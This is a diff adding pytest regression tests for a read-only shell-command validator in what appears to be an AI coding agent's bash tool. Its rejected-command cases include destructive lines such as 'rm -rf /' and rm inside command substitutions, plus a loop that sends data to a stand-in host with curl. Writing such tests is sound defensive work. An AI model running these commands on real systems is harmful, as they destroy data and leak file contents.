@@ -146,3 +146,96 @@ async def test_shell_heredoc_command():
 
     assert result["success"] is True
     assert "print('hello')" in result["stdout"]
+
+
+class TestReadonlyControlFlow:
+    """Read-only shell control-flow validation (glm-5.1 docs-audit regression).
+
+    The agent repeatedly emitted read-only `for`/`if`/`while` loops that were
+    rejected ("Command 'for' is not allowed in readonly mode") because the
+    validator treated shell keywords as commands. Control-flow keywords are now
+    structural: the loop *body* commands, command substitutions and assignment
+    RHS are still validated, so read-only loops pass but mutations are rejected.
+    """
+
+    @staticmethod
+    def _valid(cmd: str) -> bool:
+        from victor.tools.bash import _validate_readonly_command
+
+        return _validate_readonly_command(cmd)[0]
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # The exact failing pattern from the transcript.
+            'for d in docs/*/; do cnt=$(find "$d" -name "*.md" | wc -l); echo "$d : $cnt"; done',
+            "for i in 1 2 3; do echo $i; done",
+            "if [ -f README.md ]; then cat README.md; fi",
+            'while read line; do echo "$line"; done',
+            "cnt=$(find . -name '*.py' | wc -l)",
+            "for f in a b c; do test -f $f; done",
+        ],
+    )
+    def test_readonly_control_flow_allowed(self, cmd):
+        assert self._valid(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "for x in *; do rm $x; done",  # mutation in loop body
+            "for x in $(rm -rf /tmp/x); do echo $x; done",  # mutation in header sub
+            "if true; then mv a b; fi",  # mutation in if body
+            "echo $(rm important.txt)",  # mutation in command substitution
+            'echo "x" > file.txt',  # write redirect
+            "while read l; do curl http://evil/$l; done",  # non-readonly in body
+        ],
+    )
+    def test_readonly_control_flow_rejected(self, cmd):
+        assert self._valid(cmd) is False
+
+    def test_simple_commands_unaffected(self):
+        assert self._valid("ls -la") is True
+        assert self._valid("cd src && grep -n foo bar.py") is True
+        assert self._valid("rm -rf /") is False
+        assert self._valid("git status") is True
+        assert self._valid("git push") is False
+
+
+class TestReadonlyQuoteAwareSubstitutions:
+    """Quote-aware substitution scanning (regression: literal backticks/pipes).
+
+    Markdown/mermaid audits run `grep '^```mermaid'` and `grep -c '```\|```'`.
+    A prior naive scanner treated the single-quoted backticks as command
+    substitutions and surfaced a spurious `|` command, wrongly rejecting these
+    read-only greps. Single quotes are literal in shell, so they must pass; real
+    (unquoted / double-quoted) substitutions must still be validated.
+    """
+
+    @staticmethod
+    def _valid(cmd: str) -> bool:
+        from victor.tools.bash import _validate_readonly_command
+
+        return _validate_readonly_command(cmd)[0]
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "grep -n '^```mermaid' docs/architecture/BLUEPRINT.md",
+            "grep -c '```\\|```' docs/architecture/BLUEPRINT.md",
+            "echo '$(rm -rf /)'",  # single-quoted -> literal -> safe
+            "cat file `echo hi`",  # real backtick sub of a read-only command
+        ],
+    )
+    def test_quoted_literals_and_safe_subs_allowed(self, cmd):
+        assert self._valid(cmd) is True
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat $(rm important.txt)",  # unquoted substitution mutation
+            "cat file `rm important.txt`",  # backtick substitution mutation
+            'echo "$(rm important.txt)"',  # double-quoted subs ARE active in shell
+        ],
+    )
+    def test_real_substitution_mutations_rejected(self, cmd):
+        assert self._valid(cmd) is False
